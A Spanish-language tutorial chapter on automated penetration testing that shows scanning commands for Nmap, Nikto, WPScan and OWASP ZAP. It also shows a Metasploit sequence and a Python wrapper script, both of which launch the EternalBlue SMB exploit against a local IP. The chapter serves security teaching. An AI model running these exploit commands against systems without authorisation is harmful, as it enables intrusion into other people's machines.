# 9. Pentesting Automatizado

El **Pentesting** (pruebas de penetración) es el proceso de simular ataques cibernéticos contra un sistema con el fin de identificar vulnerabilidades antes de que los atacantes reales las exploten. En este capítulo, veremos cómo automatizar pruebas de penetración utilizando herramientas de código abierto y scripts personalizados.

---

## 9.1. ¿Qué es el Pentesting?

El **Pentesting** implica evaluar la seguridad de un sistema buscando debilidades explotables. Puede involucrar pruebas tanto internas como externas y se divide generalmente en:

1. **Reconocimiento**: Recopilar información sobre el objetivo.
2. **Escaneo**: Identificar puertos, servicios y vulnerabilidades.
3. **Explotación**: Intentar explotar las vulnerabilidades encontradas.
4. **Post-explotación**: Obtener acceso adicional o moverse lateralmente a través de la red.

---

## 9.2. Herramientas Automáticas para Pentesting

### 9.2.1. Metasploit

**Metasploit Framework** es una de las herramientas más populares para pruebas de penetración automatizadas. Contiene una amplia colección de exploits y permite realizar pruebas de penetración en múltiples servicios.

**Instalación de Metasploit**:
```bash
sudo apt install metasploit-framework
```

**Ejemplo de uso en un ataque básico**:
```bash
# Iniciar Metasploit
msfconsole

# Realizar un escaneo de red
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.1
set THREADS 10
run

# Exploitar una vulnerabilidad
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.5
exploit
```

### 9.2.2. Nikto

**Nikto** es una herramienta de escaneo web que permite identificar vulnerabilidades en servidores web, como configuraciones inseguras y software obsoleto.

**Instalación de Nikto**:
```bash
sudo apt install nikto
```

**Escanear un sitio web**:
```bash
nikto -h http://example.com
```

### 9.2.3. Burp Suite

**Burp Suite** es una plataforma para realizar pruebas de seguridad web que incluye herramientas para realizar escaneos automáticos, interceptar y modificar tráfico web, y detectar vulnerabilidades en aplicaciones web.

- **Burp Scanner**: Para realizar escaneos automáticos de vulnerabilidades.
- **Burp Intruder**: Para automatizar ataques de fuerza bruta y pruebas de fuzzing.

### 9.2.4. Nmap

**Nmap** es una herramienta que permite realizar escaneos de red y puertos. Puede ser automatizada mediante scripts para realizar pruebas de penetración de manera eficiente.

**Ejemplo de escaneo de red automatizado**:
```bash
nmap -sS -A -T4 192.168.1.0/24 -oN reporte_nmap.txt
```

### 9.2.5. WPScan

**WPScan** es una herramienta diseñada para realizar pruebas de penetración en sitios web basados en **WordPress**. Identifica temas, plugins, y configuraciones vulnerables.

**Instalación de WPScan**:
```bash
sudo apt install wpscan
```

**Escaneo básico de un sitio WordPress**:
```bash
wpscan --url http://example.com --enumerate vp
```

---

## 9.3. Automatización de Pruebas de Penetración con Scripts

### 9.3.1. Script en Python para Escaneo de Vulnerabilidades

Con Python y la biblioteca **subprocess**, podemos automatizar el uso de herramientas como **Nmap** y **Metasploit** para ejecutar pruebas de penetración básicas.

```python
import subprocess

# Función para escanear puertos con Nmap
def escanear_puertos(host):
    print(f"Escaneando puertos abiertos en {host}...")
    resultado = subprocess.run(['nmap', '-sS', '-p-', host], capture_output=True, text=True)
    print(resultado.stdout)

# Función para ejecutar un exploit con Metasploit
def ejecutar_exploit(host):
    print(f"Ejecutando exploit en {host}...")
    msfscript = '''
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOST {}
    exploit
    '''.format(host)
    resultado = subprocess.run(['msfconsole', '-q', '-x', msfscript], capture_output=True, text=True)
    print(resultado.stdout)

# Ejemplo de uso
escanear_puertos('192.168.1.5')
ejecutar_exploit('192.168.1.5')
```

### 9.3.2. Programación de Pentests con Cron

Al igual que con las auditorías de seguridad, podemos automatizar pruebas de penetración periódicas utilizando **Cron** en Linux. Aquí te mostramos cómo programar un escaneo semanal de vulnerabilidades con **Nikto**.

```bash
# Abrir el archivo crontab
crontab -e

# Agregar la tarea programada (escaneo todos los lunes a las 2:00 AM)
0 2 * * 1 nikto -h http://example.com -output /var/log/nikto_reporte.txt
```

---

## 9.4. Pentesting Web Automatizado con Burp Suite

Burp Suite puede automatizar pruebas de aplicaciones web a través de su herramienta **Burp Scanner**. A continuación se muestra cómo realizar un escaneo automatizado utilizando Burp Suite.

### 9.4.1. Configuración del Escaneo Automático

1. **Configurar el Proxy**: Configura el navegador para que todo el tráfico pase a través de Burp Suite, interceptando y analizando todas las solicitudes y respuestas HTTP.
   
2. **Iniciar un Escaneo Automático**: Burp Scanner analiza las páginas web y busca vulnerabilidades comunes, como inyecciones SQL, XSS y CSRF.

3. **Revisión de Resultados**: Los resultados del escaneo se presentan con información detallada sobre las vulnerabilidades encontradas y posibles soluciones.

---

## 9.5. Automatización con OWASP ZAP

**OWASP ZAP** (Zed Attack Proxy) es una herramienta de código abierto para pruebas de seguridad en aplicaciones web que también permite la automatización mediante scripts y una API REST.

### 9.5.1. Instalación y Uso de OWASP ZAP

**Instalación en Linux**:
```bash
sudo apt install zaproxy
```

**Automatización de un escaneo completo**:
```bash
zap-cli start
zap-cli open-url http://example.com
zap-cli active-scan http://example.com
zap-cli report -o reporte_zap.html -f html
```

### 9.5.2. Automatización mediante la API de OWASP ZAP

ZAP incluye una **API REST** que permite automatizar escaneos y gestionar las vulnerabilidades encontradas mediante scripts en Python o Bash.

---

## 9.6. Buenas Prácticas en Pentesting Automatizado

1. **Realiza pruebas en entornos controlados**: Asegúrate de contar con el permiso adecuado antes de realizar pruebas en un entorno de producción.
2. **Automatiza solo lo necesario**: Algunas pruebas requieren análisis manual, por lo que la automatización no debe reemplazar completamente la intervención humana.
3. **Mantén las herramientas actualizadas**: Las herramientas de pentesting y scripts deben mantenerse al día para detectar nuevas vulnerabilidades.
4. **Analiza los resultados detalladamente**: Los resultados de escaneos automatizados pueden generar falsos positivos, por lo que es importante revisarlos antes de tomar acciones.

---

## 9.7. Conclusión

La automatización en pentesting es una forma eficiente de identificar vulnerabilidades rápidamente y sin intervención manual constante. Sin embargo, sigue siendo necesario realizar revisiones manuales y asegurar que el entorno donde se aplican estas pruebas es controlado y seguro.

---

## Referencias
- [Metasploit Framework](https://www.metasploit.com/)
- [Nikto Web Scanner](https://cirt.net/Nikto2)
- [Burp Suite](https://portswigger.net/burp)
- [Nmap](https://nmap.org/)
- [WPScan](https://wpscan.com/)
- [OWASP ZAP](https://www.zaproxy.org/)
```
